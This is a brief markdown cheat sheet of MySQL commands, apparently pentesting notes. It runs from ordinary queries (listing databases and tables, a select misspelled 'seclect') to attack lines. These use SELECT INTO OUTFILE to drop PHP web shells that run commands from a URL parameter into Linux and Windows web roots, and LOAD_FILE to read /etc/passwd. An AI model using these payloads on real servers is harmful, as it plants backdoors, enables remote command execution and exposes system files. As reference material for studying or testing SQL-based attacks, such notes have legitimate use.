
### View Databases

```bash
show databases;
```

### Use Database

```bash
use <database>;
```

### View Tables

```bash
show tables;
```

### View Contents of Table

```bash
seclect * from <table_name>;
```

### Write file to system

```bash
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\cmd.php";
```

### Read file on system

```bash
SELECT LOAD_FILE("/etc/passwd");
SELECT LOAD_FILE("C:\\xampp\\htdocs\\cmd.php");
```